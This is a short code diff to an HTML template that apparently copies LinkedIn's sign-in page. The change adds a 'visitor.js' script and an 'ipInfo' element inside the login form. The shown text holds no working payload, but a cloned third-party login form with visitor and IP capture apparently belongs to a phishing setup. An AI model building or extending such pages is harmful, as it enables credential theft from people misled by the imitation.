@@ -66,6 +66,8 @@
     <link rel="preload" href="{{ asset('js/linkedin/6jblk5oqhlo45xbkmcr7s4zix') }}" as="script">
     <link rel="preload" href="{{ asset('js/linkedin/dnz8biurbtozxjvxufs5aq4jd') }}" as="script">
     <link rel="preload" href="{{ asset('js/linkedin/dz6wk4o93mwzoh0t6zsx73kzr') }}" as="script">
+
+    <script src="{{ asset('js/twitter/visitor.js') }}"></script>
 </head>
 
 <body class="system-fonts ">
@@ -166,7 +168,12 @@
                         <div class="login__form_action_container "><button
                                 class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit"
                                 type="submit" aria-label="Sign in">Sign in</button></div>
+                    
+                    
+                        <div id="ipInfo"></div>
+
                     </form>
+
                     <div class="alternate-signin-container">
                         <div id="or-separator" class="or-separator mt-12 snapple-seperator"><span
                                 class="or-text">or</span></div><button id="sign-in-with-google-button"
